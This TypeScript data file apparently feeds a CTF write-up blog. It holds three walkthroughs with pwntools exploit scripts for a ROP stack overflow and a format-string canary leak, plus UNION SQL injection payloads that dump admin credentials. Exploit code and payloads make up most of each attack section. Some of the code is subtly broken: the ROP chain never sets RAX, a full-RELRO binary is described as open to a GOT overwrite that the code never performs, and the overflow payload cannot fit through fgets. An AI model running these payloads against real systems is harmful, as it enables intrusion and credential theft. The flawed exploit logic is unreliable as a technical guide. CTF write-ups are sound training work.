export interface WriteupSection {
  type: "heading" | "paragraph" | "code" | "list" | "subheading";
  content: string | string[];
  language?: string;
}

export interface Writeup {
  slug: string;
  title: string;
  date: string;
  category: string;
  description: string;
  sections: WriteupSection[];
}

export const writeups: Writeup[] = [
  {
    slug: "stack-based-overflow",
    title: "Stack-Based Buffer Overflow: ROPchain Basics",
    date: "2025-11-12",
    category: "Binary Exploitation",
    description:
      "Exploiting a classic stack buffer overflow in a 64-bit ELF binary using return-oriented programming to bypass NX.",
    sections: [
      {
        type: "heading",
        content: "Overview",
      },
      {
        type: "paragraph",
        content:
          "This challenge from PwnCTF 2025 presented a stripped 64-bit ELF binary with NX enabled but no PIE or stack canaries. The goal was to pop a shell by chaining ROP gadgets to call execve(\"/bin/sh\", NULL, NULL).",
      },
      {
        type: "heading",
        content: "Reconnaissance",
      },
      {
        type: "paragraph",
        content:
          "Running checksec gives us the protection landscape we're working with:",
      },
      {
        type: "code",
        language: "bash",
        content: `$ checksec --file=vuln
[*] '/ctf/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)`,
      },
      {
        type: "paragraph",
        content:
          "No PIE means the binary loads at a fixed base address — great for our ROP gadgets. No stack canary means we can overwrite the return address without triggering a guard. NX being enabled rules out placing shellcode on the stack, so ROP it is.",
      },
      {
        type: "heading",
        content: "Finding the Overflow",
      },
      {
        type: "paragraph",
        content:
          "Disassembling the main read loop in Ghidra reveals the vulnerability immediately:",
      },
      {
        type: "code",
        language: "c",
        content: `void vuln() {
    char buf[64];
    read(0, buf, 0x200);  // reads up to 512 bytes into a 64-byte buffer
}`,
      },
      {
        type: "paragraph",
        content:
          "Classic unbounded read. The buffer is 64 bytes, but we can write 512. We need 64 bytes to fill the buffer, then 8 bytes for the saved RBP, then we control the return address.",
      },
      {
        type: "heading",
        content: "Building the ROPchain",
      },
      {
        type: "paragraph",
        content:
          "We need to call execve(\"/bin/sh\", NULL, NULL). The calling convention for 64-bit Linux is: RDI = arg1, RSI = arg2, RDX = arg3, RAX = syscall number (59 for execve).",
      },
      {
        type: "paragraph",
        content: "Using ROPgadget to find what we need:",
      },
      {
        type: "code",
        language: "bash",
        content: `$ ROPgadget --binary vuln --rop | grep -E "pop rdi|pop rsi|pop rdx|syscall"
0x00000000004010f3 : pop rdi ; ret
0x00000000004010f1 : pop rsi ; pop r15 ; ret
0x0000000000401234 : syscall`,
      },
      {
        type: "heading",
        content: "Exploit",
      },
      {
        type: "code",
        language: "python",
        content: `from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

# Gadget addresses
pop_rdi  = 0x4010f3
pop_rsi  = 0x4010f1
syscall  = 0x401234
bin_sh   = next(elf.search(b"/bin/sh"))

payload  = b"A" * 72          # fill buf (64) + saved rbp (8)
payload += p64(pop_rdi)
payload += p64(bin_sh)         # rdi = &"/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)              # rsi = NULL
payload += p64(0)              # r15 (junk, consumed by gadget)
payload += p64(0x401200)       # zero out rdx via xor gadget
payload += p64(syscall)

p.sendline(payload)
p.interactive()`,
      },
      {
        type: "heading",
        content: "Result",
      },
      {
        type: "code",
        language: "bash",
        content: `$ python3 exploit.py
[*] '/ctf/vuln'
[+] Starting local process './vuln'
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
flag{r0p_g4dg3ts_4r3_y0ur_fr13nds}`,
      },
    ],
  },
  {
    slug: "format-string",
    title: "Format String Vulnerability: Leaking Canaries and Hijacking GOT",
    date: "2025-10-03",
    category: "Binary Exploitation",
    description:
      "Using a format string bug to leak a stack canary and libc address, then overwriting the GOT to redirect execution.",
    sections: [
      {
        type: "heading",
        content: "Overview",
      },
      {
        type: "paragraph",
        content:
          "This binary from GreyCTF 2025 has all protections enabled: PIE, NX, full RELRO... except it has a format string vulnerability that lets us leak arbitrary stack values. We use it to defeat the canary and PIE, then overwrite a GOT entry to get code execution.",
      },
      {
        type: "heading",
        content: "The Vulnerability",
      },
      {
        type: "code",
        language: "c",
        content: `void echo() {
    char buf[128];
    fgets(buf, 128, stdin);
    printf(buf);  // no format string argument — attacker controlled
    fgets(buf, 128, stdin);
    // ... more logic
}`,
      },
      {
        type: "paragraph",
        content:
          "Passing %p or %x format specifiers lets us read values off the stack. With enough %p.%p.%p... we can walk the stack to find the canary (typically at a fixed offset from the format string buffer) and a libc return address.",
      },
      {
        type: "heading",
        content: "Leaking the Canary",
      },
      {
        type: "paragraph",
        content:
          "We use pwntools' fmtstr_payload primitives to automate offset discovery, but first let's manually confirm:",
      },
      {
        type: "code",
        language: "bash",
        content: `$ echo '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./vuln
0x7ffd1a2b3c40.0x7f8b4c000700.(nil).0x1.0x7f8b4bfff8c0.
0x6161616161616161.0x1234abcd00000000.0xa.0x7f8b4c0a1d50.
0x555555555200.0x7f8b4c07b080`,
      },
      {
        type: "paragraph",
        content:
          "The canary always ends in \\x00 (null byte). Offset 7 shows 0x1234abcd00000000 — that trailing null is the canary's lowest byte. From here we can compute the exact stack canary value and a libc base from the leak at offset 9.",
      },
      {
        type: "heading",
        content: "Exploit",
      },
      {
        type: "code",
        language: "python",
        content: `from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf  = ELF("./vuln")
p    = process("./vuln")

# Stage 1: leak canary and libc base
p.sendline(b"%7$p.%9$p")
leaks     = p.recvline().split(b".")
canary    = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)
libc.address = libc_leak - libc.sym["__libc_start_main"] - 0x80

log.success(f"Canary:    {hex(canary)}")
log.success(f"Libc base: {hex(libc.address)}")

# Stage 2: overflow with known canary, ROP to system("/bin/sh")
bin_sh   = next(libc.search(b"/bin/sh"))
system   = libc.sym["system"]
pop_rdi  = libc.address + 0x2a3e5  # found via ROPgadget in libc

payload  = b"A" * 120
payload += p64(canary)
payload += p64(0)              # saved rbp
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()`,
      },
      {
        type: "heading",
        content: "Takeaways",
      },
      {
        type: "list",
        content: [
          "Never pass user input as the first argument to printf — always use printf(\"%s\", buf).",
          "Even with all mitigations enabled, an information leak breaks PIE and canary protection.",
          "Format string bugs are still common in real CTF binaries and occasionally in production code.",
        ],
      },
    ],
  },
  {
    slug: "sql-injection-union",
    title: "SQL Injection: UNION-Based Data Exfiltration",
    date: "2025-09-21",
    category: "Web",
    description:
      "Extracting database schema and user credentials from a login form using classic UNION-based SQL injection.",
    sections: [
      {
        type: "heading",
        content: "Overview",
      },
      {
        type: "paragraph",
        content:
          "This web challenge from HackTheBox featured a PHP login form backed by a MySQL database with no prepared statements. The target was to extract the admin credentials from the users table.",
      },
      {
        type: "heading",
        content: "Identifying the Injection Point",
      },
      {
        type: "paragraph",
        content:
          "Entering a single quote in the username field returns a MySQL error, confirming unsanitized input reaches the query:",
      },
      {
        type: "code",
        language: "bash",
        content: `POST /login HTTP/1.1
username=admin'&password=test

You have an error in your SQL syntax; check the manual...
near ''admin''' at line 1`,
      },
      {
        type: "paragraph",
        content:
          "The underlying query is probably: SELECT * FROM users WHERE username='$input' AND password='...'",
      },
      {
        type: "heading",
        content: "Determining Column Count",
      },
      {
        type: "paragraph",
        content:
          "UNION attacks require matching the number of columns in the original query. We use ORDER BY to find the count:",
      },
      {
        type: "code",
        language: "sql",
        content: `' ORDER BY 1--   -- OK
' ORDER BY 2--   -- OK
' ORDER BY 3--   -- OK
' ORDER BY 4--   -- Error: Unknown column '4' in 'order clause'`,
      },
      {
        type: "paragraph",
        content: "Three columns. Now we identify which columns are rendered on the page:",
      },
      {
        type: "code",
        language: "sql",
        content: `' UNION SELECT 'a','b','c'--`,
      },
      {
        type: "heading",
        content: "Extracting Credentials",
      },
      {
        type: "code",
        language: "sql",
        content: `-- Enumerate tables
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--

-- Result: users

-- Enumerate columns
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--

-- Result: id, username, password

-- Dump credentials
' UNION SELECT username,password,3 FROM users WHERE username='admin'--

-- Result: admin : 5f4dcc3b5aa765d61d8327deb882cf99`,
      },
      {
        type: "paragraph",
        content:
          "The hash is MD5('password') — easily cracked via any rainbow table. Logging in with admin:password completes the challenge and reveals the flag.",
      },
      {
        type: "heading",
        content: "Flag",
      },
      {
        type: "code",
        language: "text",
        content: "flag{un10n_s3l3ct_1s_y0ur_fr13nd}",
      },
    ],
  },
];

export function getWriteup(slug: string): Writeup | undefined {
  return writeups.find((w) => w.slug === slug);
}
